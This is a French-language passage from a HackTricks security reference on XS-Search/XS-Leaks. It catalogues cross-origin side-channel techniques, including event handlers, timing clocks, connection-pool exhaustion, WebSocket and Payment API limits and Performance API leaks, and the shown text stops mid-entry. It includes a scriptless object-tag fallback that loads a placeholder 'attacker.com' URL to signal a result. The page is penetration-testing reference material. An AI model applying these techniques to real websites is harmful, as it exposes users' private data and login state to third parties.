# XS-Search/XS-Leaks

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

Utilisez [\*\*\*\*](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) pour construire et **automatiser des flux de travail** facilement grâce aux **outils communautaires les plus avancés** au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

XS-Search est une méthode utilisée pour **extraire des informations cross-origin** en exploitant des **vulnérabilités de canal auxiliaire**.

Les composants clés impliqués dans cette attaque comprennent :

- **Web vulnérable** : Le site web cible à partir duquel les informations doivent être extraites.
- **Web de l'attaquant** : Le site web malveillant créé par l'attaquant, que la victime visite, hébergeant l'exploit.
- **Méthode d'inclusion** : La technique employée pour incorporer le Web vulnérable dans le Web de l'attaquant (par exemple, window.open, iframe, fetch, balise HTML avec href, etc.).
- **Technique de fuite** : Techniques utilisées pour discerner les différences dans l'état du Web vulnérable en fonction des informations recueillies par la méthode d'inclusion.
- **États** : Les deux conditions potentielles du Web vulnérable, que l'attaquant vise à distinguer.
- **Différences détectables** : Variations observables sur lesquelles l'attaquant s'appuie pour inférer l'état du Web vulnérable.

### Différences détectables

Plusieurs aspects peuvent être analysés pour différencier les états du Web vulnérable :

- **Code d'état** : Distinguer entre **divers codes d'état de réponse HTTP** cross-origin, comme les erreurs serveur, les erreurs client ou les erreurs d'authentification.
- **Utilisation de l'API** : Identifier l'**utilisation des API Web** à travers les pages, révélant si une page cross-origin utilise une API Web JavaScript spécifique.
- **Redirections** : Détecter les navigations vers différentes pages, pas seulement les redirections HTTP mais aussi celles déclenchées par JavaScript ou HTML.
- **Contenu de la page** : Observer les **variations dans le corps de la réponse HTTP** ou dans les sous-ressources de la page, telles que le **nombre de cadres intégrés** ou les disparités de taille dans les images.
- **En-tête HTTP** : Noter la présence ou éventuellement la valeur d'un **en-tête de réponse HTTP spécifique**, y compris des en-têtes comme X-Frame-Options, Content-Disposition et Cross-Origin-Resource-Policy.
- **Temps** : Remarquer des disparités de temps cohérentes entre les deux états.

### Méthodes d'inclusion

- **Éléments HTML** : HTML offre divers éléments pour **l'inclusion de ressources cross-origin**, comme des feuilles de style, des images ou des scripts, obligeant le navigateur à demander une ressource non-HTML. Une compilation des éléments HTML potentiels à cet effet peut être trouvée sur [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
- **Cadres** : Des éléments tels que **iframe**, **object** et **embed** peuvent intégrer des ressources HTML directement dans la page de l'attaquant. Si la page **manque de protection contre le framing**, JavaScript peut accéder à l'objet window de la ressource encadrée via la propriété contentWindow.
- **Pop-ups** : La méthode **`window.open`** ouvre une ressource dans un nouvel onglet ou une nouvelle fenêtre, fournissant un **handle de fenêtre** pour que JavaScript interagisse avec des méthodes et des propriétés suivant le SOP. Les pop-ups, souvent utilisées dans le cadre de l'authentification unique, contournent les restrictions de framing et de cookies d'une ressource cible. Cependant, les navigateurs modernes restreignent la création de pop-ups à certaines actions de l'utilisateur.
- **Requêtes JavaScript** : JavaScript permet des requêtes directes vers des ressources cibles en utilisant **XMLHttpRequests** ou l'**API Fetch**. Ces méthodes offrent un contrôle précis sur la requête, comme choisir de suivre les redirections HTTP.

### Techniques de fuite

- **Gestionnaire d'événements** : Une technique de fuite classique dans les XS-Leaks, où des gestionnaires d'événements comme **onload** et **onerror** fournissent des informations sur le succès ou l'échec du chargement des ressources.
- **Messages d'erreur** : Les exceptions JavaScript ou les pages d'erreur spéciales peuvent fournir des informations de fuite soit directement à partir du message d'erreur, soit en différenciant sa présence et son absence.
- **Limites globales** : Les limitations physiques d'un navigateur, comme la capacité mémoire ou d'autres limites imposées par le navigateur, peuvent signaler lorsqu'un seuil est atteint, servant de technique de fuite.
- **État global** : Les interactions détectables avec les **états globaux** des navigateurs (par exemple, l'interface History) peuvent être exploitées. Par exemple, le **nombre d'entrées** dans l'historique d'un navigateur peut offrir des indices sur les pages cross-origin.
- **API de performance** : Cette API fournit des **détails de performance de la page actuelle**, y compris le timing réseau pour le document et les ressources chargées, permettant d'inférer sur les ressources demandées.
- **Attributs lisibles** : Certains attributs HTML sont **lisibles cross-origin** et peuvent être utilisés comme technique de fuite. Par exemple, la propriété `window.frame.length` permet à JavaScript de compter les cadres inclus dans une page web cross-origin.

## Outil & Document XSinator

XSinator est un outil automatique pour **vérifier les navigateurs contre plusieurs XS-Leaks connus** expliqués dans son document : [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Vous pouvez **accéder à l'outil sur** [**https://xsinator.com/**](https://xsinator.com/)

> [!WARNING]
> **XS-Leaks exclus** : Nous avons dû exclure les XS-Leaks qui reposent sur des **workers de service** car ils interfèreraient avec d'autres fuites dans XSinator. De plus, nous avons choisi d'**exclure les XS-Leaks qui reposent sur des erreurs de configuration et des bugs dans une application web spécifique**. Par exemple, les erreurs de configuration Cross-Origin Resource Sharing (CORS), les fuites postMessage ou le Cross-Site Scripting. De plus, nous avons exclu les XS-Leaks basés sur le temps car ils souffrent souvent d'être lents, bruyants et inexactes.

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) pour construire et **automatiser des flux de travail** facilement grâce aux **outils communautaires les plus avancés** au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## **Techniques basées sur le temps**

Certaines des techniques suivantes vont utiliser le temps comme partie du processus pour détecter les différences dans les états possibles des pages web. Il existe différentes manières de mesurer le temps dans un navigateur web.

**Horloges** : L'API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permet aux développeurs d'obtenir des mesures de temps à haute résolution.\
Il existe un nombre considérable d'APIs que les attaquants peuvent abuser pour créer des horloges implicites : [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), animations CSS, et d'autres.\
Pour plus d'infos : [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Techniques de gestionnaire d'événements

### Onload/Onerror

- **Méthodes d'inclusion** : Cadres, Éléments HTML
- **Différence détectable** : Code d'état
- **Plus d'infos** : [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
- **Résumé** : si l'on essaie de charger une ressource, les événements onerror/onload sont déclenchés lorsque la ressource est chargée avec succès/échoue, il est possible de déterminer le code d'état.
- **Exemple de code** : [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)

{{#ref}}
cookie-bomb-+-onerror-xs-leak.md
{{#endref}}

L'exemple de code essaie de **charger des objets de scripts JS**, mais **d'autres balises** telles que des objets, des feuilles de style, des images, des audios pourraient également être utilisées. De plus, il est également possible d'injecter la **balise directement** et de déclarer les événements `onload` et `onerror` à l'intérieur de la balise (au lieu de l'injecter depuis JS).

Il existe également une version sans script de cette attaque :
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Dans ce cas, si `example.com/404` n'est pas trouvé, `attacker.com/?error` sera chargé.

### Onload Timing

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Timing (généralement dû au contenu de la page, code d'état)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
- **Summary:** L'API [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **peut être utilisée pour mesurer combien de temps il faut pour effectuer une requête. Cependant, d'autres horloges pourraient être utilisées, comme l'[**API PerformanceLongTaskTiming**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) qui peut identifier les tâches s'exécutant pendant plus de 50 ms.**
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) un autre exemple dans :

{{#ref}}
performance.now-example.md
{{#endref}}

#### Onload Timing + Forced Heavy Task

Cette technique est similaire à la précédente, mais l'**attaquant** va également **forcer** une action pour prendre un **temps pertinent** lorsque la **réponse est positive ou négative** et mesurer ce temps.

{{#ref}}
performance.now-+-force-heavy-task.md
{{#endref}}

### unload/beforeunload Timing

- **Inclusion Methods**: Frames
- **Detectable Difference**: Timing (généralement dû au contenu de la page, code d'état)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
- **Summary:** L'horloge [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) peut être utilisée pour mesurer combien de temps il faut pour effectuer une requête. D'autres horloges pourraient être utilisées.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Le temps nécessaire pour récupérer une ressource peut être mesuré en utilisant les événements [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) et [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event). L'événement **`beforeunload`** est déclenché lorsque le navigateur est sur le point de naviguer vers une nouvelle page, tandis que l'événement **`unload`** se produit lorsque la navigation a effectivement lieu. La différence de temps entre ces deux événements peut être calculée pour déterminer la **durée que le navigateur a passée à récupérer la ressource**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

- **Inclusion Methods**: Frames
- **Detectable Difference**: Timing (généralement dû au contenu de la page, code d'état)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
- **Summary:** L'API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) peut être utilisée pour mesurer combien de temps il faut pour effectuer une requête. D'autres horloges pourraient être utilisées.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Il a été observé qu'en l'absence de [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), le temps nécessaire pour qu'une page et ses sous-ressources se chargent sur le réseau peut être mesuré par un attaquant. Cette mesure est généralement possible car le gestionnaire `onload` d'un iframe est déclenché uniquement après l'achèvement du chargement des ressources et de l'exécution de JavaScript. Pour contourner la variabilité introduite par l'exécution de scripts, un attaquant pourrait utiliser l'attribut [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) dans le `<iframe>`. L'inclusion de cet attribut restreint de nombreuses fonctionnalités, notamment l'exécution de JavaScript, facilitant ainsi une mesure qui est principalement influencée par la performance du réseau.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

- **Inclusion Methods**: Frames
- **Detectable Difference**: Contenu de la page
- **More info**:
- **Summary**: Si vous pouvez provoquer une erreur sur la page lorsque le contenu correct est accédé et la faire charger correctement lorsque n'importe quel contenu est accédé, alors vous pouvez créer une boucle pour extraire toutes les informations sans mesurer le temps.
- **Code Example**:

Supposons que vous puissiez **insérer** la **page** qui contient le **contenu secret** **dans un Iframe**.

Vous pouvez **faire rechercher à la victime** le fichier qui contient "_**flag**_" en utilisant un **Iframe** (en exploitant un CSRF par exemple). À l'intérieur de l'Iframe, vous savez que l'_**événement onload**_ sera **exécuté toujours au moins une fois**. Ensuite, vous pouvez **changer** l'**URL** de l'**iframe** mais en changeant uniquement le **contenu** du **hash** à l'intérieur de l'URL.

Par exemple :

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Si la première URL a été **chargée avec succès**, alors, en **changeant** la partie **hash** de l'URL, l'**événement onload** **ne sera pas déclenché** à nouveau. Mais **si** la page avait une sorte d'**erreur** lors du **chargement**, alors, l'**événement onload** sera **déclenché à nouveau**.

Ensuite, vous pouvez **distinguer entre** une page **chargée correctement** ou une page qui a une **erreur** lorsqu'elle est accédée.

### Exécution Javascript

- **Inclusion Methods**: Frames
- **Detectable Difference**: Contenu de la page
- **More info**:
- **Summary:** Si la **page** renvoie le **contenu sensible**, **ou** un **contenu** qui peut être **contrôlé** par l'utilisateur. L'utilisateur pourrait définir **un code JS valide dans le cas négatif**, un **chargement** à chaque essai à l'intérieur des **`<script>`** tags, donc dans les cas **négatifs**, le **code** des attaquants est **exécuté**, et dans les cas **affirmatifs**, **rien** ne sera exécuté.
- **Code Example:**

{{#ref}}
javascript-execution-xs-leak.md
{{#endref}}

### CORB - Onerror

- **Inclusion Methods**: Éléments HTML
- **Detectable Difference**: Code d'état & En-têtes
- **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
- **Summary**: **Cross-Origin Read Blocking (CORB)** est une mesure de sécurité qui empêche les pages web de charger certaines ressources sensibles d'origine croisée pour se protéger contre des attaques comme **Spectre**. Cependant, les attaquants peuvent exploiter son comportement protecteur. Lorsqu'une réponse soumise à **CORB** renvoie un `Content-Type` _**protégé par CORB**_ avec `nosniff` et un code d'état `2xx`, **CORB** supprime le corps et les en-têtes de la réponse. Les attaquants observant cela peuvent déduire la combinaison du **code d'état** (indiquant succès ou erreur) et du `Content-Type` (indiquant s'il est protégé par **CORB**), ce qui peut entraîner une fuite d'informations potentielle.
- **Code Example**:

Vérifiez le lien d'informations supplémentaires pour plus d'informations sur l'attaque.

### onblur

- **Inclusion Methods**: Frames
- **Detectable Difference**: Contenu de la page
- **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
- **Summary**: Fuite de données sensibles à partir de l'attribut id ou name.
- **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Il est possible de **charger une page** à l'intérieur d'un **iframe** et d'utiliser le **`#id_value`** pour faire **focaliser la page sur l'élément** de l'iframe avec l'id indiqué, puis si un signal **`onblur`** est déclenché, l'élément ID existe.\
Vous pouvez effectuer la même attaque avec des **tags** **`portal`**.

### Diffusions postMessage <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Utilisation de l'API
- **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
- **Summary**: Rassembler des informations sensibles à partir d'un postMessage ou utiliser la présence de postMessages comme un oracle pour connaître l'état de l'utilisateur sur la page
- **Code Example**: `Any code listening for all postMessages.`

Les applications utilisent fréquemment des diffusions [`postMessage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) pour communiquer entre différentes origines. Cependant, cette méthode peut involontairement exposer des **informations sensibles** si le paramètre `targetOrigin` n'est pas correctement spécifié, permettant à n'importe quelle fenêtre de recevoir les messages. De plus, le simple fait de recevoir un message peut agir comme un **oracle** ; par exemple, certains messages peuvent n'être envoyés qu'aux utilisateurs qui sont connectés. Par conséquent, la présence ou l'absence de ces messages peut révéler des informations sur l'état ou l'identité de l'utilisateur, comme s'il est authentifié ou non.

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) pour créer et **automatiser facilement des flux de travail** alimentés par les **outils communautaires les plus avancés** au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## Techniques de Limites Globales

### API WebSocket

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Utilisation de l'API
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: Épuiser la limite de connexion WebSocket révèle le nombre de connexions WebSocket d'une page d'origine croisée.
- **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)>), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)>)

Il est possible d'identifier si, et combien, de **connexions WebSocket une page cible utilise**. Cela permet à un attaquant de détecter les états d'application et de révéler des informations liées au nombre de connexions WebSocket.

Si une **origine** utilise le **nombre maximum d'objets de connexion WebSocket**, indépendamment de l'état de leurs connexions, la création de **nouveaux objets entraînera des exceptions JavaScript**. Pour exécuter cette attaque, le site web attaquant ouvre le site web cible dans une fenêtre pop-up ou un iframe et ensuite, après que le web cible a été chargé, tente de créer le maximum de connexions WebSockets possible. Le **nombre d'exceptions levées** est le **nombre de connexions WebSocket utilisées par la fenêtre du site web cible**.

### API de Paiement

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Utilisation de l'API
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: Détecter la demande de paiement car une seule peut être active à la fois.
- **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Cette fuite XS permet à un attaquant de **détecter quand une page d'origine croisée initie une demande de paiement**.

Parce que **une seule demande de paiement peut être active** à la fois, si le site web cible utilise l'API de demande de paiement, toute **tentative ultérieure d'utiliser cette API échouera**, et provoquera une **exception JavaScript**. L'attaquant peut exploiter cela en **tentant périodiquement d'afficher l'interface utilisateur de l'API de paiement**. Si une tentative provoque une exception, le site web cible l'utilise actuellement. L'attaquant peut cacher ces tentatives périodiques en fermant immédiatement l'interface utilisateur après sa création.

### Chronométrage de la boucle d'événements <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Chronométrage (généralement dû au contenu de la page, code d'état)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
- **Summary:** Mesurer le temps d'exécution d'un web en abusant de la boucle d'événements JS à thread unique.
- **Code Example**:

{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

JavaScript fonctionne sur un modèle de concurrence à [boucle d'événements à thread unique](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), signifiant qu'il **ne peut exécuter qu'une seule tâche à la fois**. Cette caractéristique peut être exploitée pour évaluer **combien de temps le code d'une autre origine prend à s'exécuter**. Un attaquant peut mesurer le temps d'exécution de son propre code dans la boucle d'événements en envoyant continuellement des événements avec des propriétés fixes. Ces événements seront traités lorsque le pool d'événements est vide. Si d'autres origines envoient également des événements au même pool, un **attaquant peut déduire le temps qu'il faut pour que ces événements externes s'exécutent en observant les retards dans l'exécution de ses propres tâches**. Cette méthode de surveillance de la boucle d'événements pour des retards peut révéler le temps d'exécution du code d'autres origines, exposant potentiellement des informations sensibles.

> [!WARNING]
> Dans un chronométrage d'exécution, il est possible d'**éliminer** les **facteurs réseau** pour obtenir des **mesures plus précises**. Par exemple, en chargeant les ressources utilisées par la page avant de la charger.

### Boucle d'événements occupée <a href="#busy-event-loop" id="busy-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Chronométrage (généralement dû au contenu de la page, code d'état)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
- **Summary:** Une méthode pour mesurer le temps d'exécution d'une opération web consiste à bloquer intentionnellement la boucle d'événements d'un thread et ensuite à chronométrer **combien de temps il faut pour que la boucle d'événements redevienne disponible**. En insérant une opération de blocage (comme un long calcul ou un appel d'API synchrone) dans la boucle d'événements, et en surveillant le temps qu'il faut pour que le code suivant commence à s'exécuter, on peut déduire la durée des tâches qui s'exécutaient dans la boucle d'événements pendant la période de blocage. Cette technique exploite la nature à thread unique de la boucle d'événements de JavaScript, où les tâches sont exécutées séquentiellement, et peut fournir des informations sur la performance ou le comportement d'autres opérations partageant le même thread.
- **Code Example**:

Un avantage significatif de la technique de mesure du temps d'exécution en verrouillant la boucle d'événements est son potentiel à contourner **l'Isolation de Site**. **L'Isolation de Site** est une fonctionnalité de sécurité qui sépare différents sites web en processus distincts, visant à empêcher les sites malveillants d'accéder directement aux données sensibles d'autres sites. Cependant, en influençant le chronométrage d'exécution d'une autre origine par le biais de la boucle d'événements partagée, un attaquant peut indirectement extraire des informations sur les activités de cette origine. Cette méthode ne repose pas sur un accès direct aux données de l'autre origine mais plutôt sur l'observation de l'impact des activités de cette origine sur la boucle d'événements partagée, contournant ainsi les barrières de protection établies par **l'Isolation de Site**.

> [!WARNING]
> Dans un chronométrage d'exécution, il est possible d'**éliminer** les **facteurs réseau** pour obtenir des **mesures plus précises**. Par exemple, en chargeant les ressources utilisées par la page avant de la charger.

### Pool de connexions

- **Inclusion Methods**: Requêtes JavaScript
- **Detectable Difference**: Chronométrage (généralement dû au contenu de la page, code d'état)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
- **Summary:** Un attaquant pourrait verrouiller toutes les sockets sauf 1, charger le web cible et en même temps charger une autre page, le temps jusqu'à ce que la dernière page commence à se charger est le temps que la page cible a mis à charger.
- **Code Example**:

{{#ref}}
connection-pool-example.md
{{#endref}}

Les navigateurs utilisent des sockets pour la communication avec le serveur, mais en raison des ressources limitées du système d'exploitation et du matériel, **les navigateurs sont contraints d'imposer une limite** sur le nombre de sockets simultanés. Les attaquants peuvent exploiter cette limitation par les étapes suivantes :

1. Déterminer la limite de sockets du navigateur, par exemple, 256 sockets globaux.
2. Occuper 255 sockets pendant une durée prolongée en initiant 255 requêtes à divers hôtes, conçues pour maintenir les connexions ouvertes sans les terminer.
3. Utiliser le 256ème socket pour envoyer une requête à la page cible.
4. Tenter une 257ème requête à un autre hôte. Étant donné que tous les sockets sont utilisés (comme indiqué aux étapes 2 et 3), cette requête sera mise en file d'attente jusqu'à ce qu'un socket devienne disponible. Le délai avant que cette requête ne progresse fournit à l'attaquant des informations de chronométrage sur l'activité réseau liée au socket du 256ème (le socket de la page cible). Cette déduction est possible car les 255 sockets de l'étape 2 sont toujours engagés, ce qui implique que tout nouveau socket disponible doit être celui libéré de l'étape 3. Le temps nécessaire pour que le 256ème socket devienne disponible est donc directement lié au temps requis pour que la requête à la page cible se termine.

Pour plus d'infos : [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Pool de connexions par destination

- **Inclusion Methods**: Requêtes JavaScript
- **Detectable Difference**: Chronométrage (généralement dû au contenu de la page, code d'état)
- **More info**:
- **Summary:** C'est comme la technique précédente mais au lieu d'utiliser tous les sockets, Google **Chrome** impose une limite de **6 requêtes simultanées à la même origine**. Si nous **bloquons 5** et ensuite **lancions une 6ème** requête, nous pouvons **la chronométrer** et si nous avons réussi à faire en sorte que la **page victime envoie** plus de **requêtes** vers le même point de terminaison pour détecter un **statut** de la **page**, la **6ème requête** prendra **plus de temps** et nous pourrons le détecter.

## Techniques de l'API de Performance

L'[`API de Performance`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) offre des aperçus sur les métriques de performance des applications web, enrichis par l'[`API de Chronométrage des Ressources`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). L'API de Chronométrage des Ressources permet de surveiller les temps de requêtes réseau détaillés, tels que la durée des requêtes. Notamment, lorsque les serveurs incluent l'en-tête `Timing-Allow-Origin: *` dans leurs réponses, des données supplémentaires comme la taille de transfert et le temps de recherche de domaine deviennent disponibles.

Cette richesse de données peut être récupérée via des méthodes comme [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ou [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), fournissant une vue complète des informations liées à la performance. De plus, l'API facilite la mesure des temps d'exécution en calculant la différence entre les horodatages obtenus à partir de [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Cependant, il convient de noter que pour certaines opérations dans des navigateurs comme Chrome, la précision de `performance.now()` peut être limitée aux millisecondes, ce qui pourrait affecter la granularité des mesures de chronométrage.

Au-delà des mesures de chronométrage, l'API de Performance peut être exploitée pour des aperçus liés à la sécurité. Par exemple, la présence ou l'absence de pages dans l'objet `performance` dans Chrome peut indiquer l'application de `X-Frame-Options`. Plus précisément, si une page est bloquée de son rendu dans un cadre en raison de `X-Frame-Options`, elle ne sera pas enregistrée dans l'objet `performance`, fournissant un indice subtil sur les politiques de cadre de la page.

### Fuite d'erreur

- **Inclusion Methods**: Frames, Éléments HTML
- **Detectable Difference**: Code d'état
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Une requête qui entraîne des erreurs ne créera pas d'entrée de chronométrage des ressources.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Il est possible de **différencier entre les codes d'état de réponse HTTP** car les requêtes qui entraînent une **erreur** ne **créent pas d'entrée de performance**.

### Erreur de rechargement de style

- **Inclusion Methods**: Éléments HTML
- **Detectable Difference**: Code d'état
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** En raison d'un bug du navigateur, les requêtes qui entraînent des erreurs sont chargées deux fois.
- **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Dans la technique précédente, deux cas ont également été identifiés où des bugs du navigateur dans GC entraînent des **ressources étant chargées deux fois lorsqu'elles échouent à se charger**. Cela entraînera plusieurs entrées dans l'API de Performance et peut donc être détecté.

### Erreur de fusion de requêtes

- **Inclusion Methods**: Éléments HTML
- **Detectable Difference**: Code d'état
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Les requêtes qui entraînent une erreur ne peuvent pas être fusionnées.
- **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

La technique a été trouvée dans un tableau dans le document mentionné mais aucune description de la technique n'a été trouvée. Cependant, vous pouvez trouver le code source en vérifiant [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Fuite de page vide

- **Inclusion Methods**: Frames
- **Detectable Difference**: Contenu de la page
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Les réponses vides ne créent pas d'entrées de chronométrage des ressources.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Un attaquant peut détecter si une requête a entraîné un corps de réponse HTTP vide car les **pages vides ne créent pas d'entrée de performance dans certains navigateurs**.

### **Fuite de l'Auditeur XSS**

- **Inclusion Methods**: Frames
- **Detectable Difference**: Contenu de la page
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** En utilisant l'Auditeur XSS dans les Assertions de Sécurité, les attaquants peuvent détecter des éléments spécifiques de la page web en observant les modifications dans les réponses lorsque des charges utiles conçues déclenchent le mécanisme de filtrage de l'auditeur.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Dans les Assertions de Sécurité (SA), l'Auditeur XSS, initialement destiné à prévenir les attaques de Cross-Site Scripting (XSS), peut paradoxalement être exploité pour fuir des informations sensibles. Bien que cette fonctionnalité intégrée ait été supprimée de Google Chrome (GC), elle est toujours présente dans SA. En 2013, Braun et Heiderich ont démontré que l'Auditeur XSS pouvait bloquer involontairement des scripts légitimes, entraînant de faux positifs. S'appuyant sur cela, des chercheurs ont développé des techniques pour extraire des informations et détecter un contenu spécifique sur des pages d'origine croisée, un concept connu sous le nom de XS-Leaks, initialement rapporté par Terada et élaboré par Heyes dans un article de blog. Bien que ces techniques soient spécifiques à l'Auditeur XSS dans GC, il a été découvert que dans SA, les pages bloquées par l'Auditeur XSS ne génèrent pas d'entrées dans l'API de Performance, révélant une méthode par laquelle des informations sensibles pourraient encore être divulguées.

### Fuite X-Frame

- **Inclusion Methods**: Frames
- **Detectable Difference**: En-tête
